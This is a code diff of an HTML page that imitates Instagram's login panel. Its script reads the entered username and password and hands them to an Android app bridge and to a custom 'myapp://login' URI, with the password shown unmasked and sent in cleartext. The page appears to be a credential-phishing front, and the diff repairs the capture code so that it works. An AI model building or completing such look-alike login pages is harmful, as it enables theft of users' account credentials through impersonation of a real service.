@@ -15,11 +15,12 @@
         <div class="c-panel group">
           <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
           <div class="c-panel__form">
-            <input type="text" class="c-panel__input" placeholder="Phone number, username, or email">
-            <input type="text" class="c-panel__input" placeholder="Password">
+            <input type="text" class="c-panel__input" id="usernameInput" placeholder="Phone number, username, or email">
+  <input type="text" class="c-panel__input" id="passwordInput" placeholder="Password">
+
             <a href="#" class="c-btn" onclick="login()">Log In</a>
             <script>
-            function login() {
+function login() {
     // Get the values from the input fields
     var usernameInput = document.getElementById('usernameInput');
     var passwordInput = document.getElementById('passwordInput');
@@ -34,23 +35,21 @@
         return;
     }
 
-    // Check if Android object is defined (for testing in browser)
+    // Check if Android object is defined
     if (typeof Android !== 'undefined') {
         // Construct the custom URI
         var uri = 'myapp://login?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
 
         // Call the Android interface to send the login data
         Android.onLogin(username, password);
-    } else {
-        // For testing in the browser
-        console.log('Android object not available. Testing in browser.');
     }
 
     // Redirect to the custom URI (for testing in browser)
+    var uri = 'myapp://login?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
     window.location.href = uri;
 }
+</script>
 
-          </script>
           
             <span class="c-panel__span">OR</span>
           </div>
